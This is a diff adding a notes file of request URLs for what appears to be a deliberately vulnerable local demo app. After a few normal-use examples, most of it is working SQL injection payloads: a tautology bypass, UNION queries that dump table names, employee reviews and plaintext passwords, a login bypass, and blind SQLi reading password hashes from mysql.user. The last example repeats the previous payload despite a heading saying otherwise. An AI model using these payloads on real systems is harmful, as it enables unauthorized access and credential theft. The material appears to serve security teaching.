@@ -1,0 +1,33 @@
+# 1) Intended usage
+http://127.0.0.1:8080/filterUserUnSafe?name=Frodo
+
+
+# 2) Login functionality
+http://localhost:8080/loginJdbcUnSafe?name=Bilbo&password=secret
+
+
+# Dangerous part
+## Simple SQLi
+http://localhost:8080/filterUserJdbcUnSafe?name=Bilbo'or'1'='1
+
+
+## Union based SQLi to get table_schema,table_name FROM information_Schema.tables
+http://localhost:8080/filterUserGlobalAccessUnSafe?name=Bilbo'union all select 1, concat(table_schema,'-----', table_name), table_name, 'STAFF'   from information_Schema.tables where '1'='1
+
+## Union based SQLi to get data from any table
+http://localhost:8080/filterUserGlobalAccessUnSafe?name=Bilbo' union all select 1, concat(review, '-----',rating), review, 'STAFF'  from management.employee_review where '1'='1
+
+
+## Union based SQLi to get plain passwords
+http://localhost:8080/filterUserGlobalAccessUnSafe?name=Bilbo' union all select 1, concat(name,'-----',password), password, 'STAFF'   from employees.employee where '1'='1
+
+## SQLi to login with bypassing user and password
+http://localhost:8080/loginJdbcUnSafe?name=1&password=1' or 1=1 and id='1
+
+## Blind injections
+### Blind SQLi to get chars from mysql.user
+The first char is $ - query succeeds
+http://localhost:8080/loginJdbcUnSafe?name=Bilbo&password=secret' and (select CASE WHEN (substring(authentication_string,1,1) = '$' ) THEN true ELSE false END from  mysql.user where User = 'empdb_user') or '
+
+### The first char is not 1 - query fails
+http://localhost:8080/loginJdbcUnSafe?name=Bilbo&password=secret' and (select CASE WHEN (substring(authentication_string,1,1) = '$' ) THEN true ELSE false END from  mysql.user where User = 'empdb_user') or '
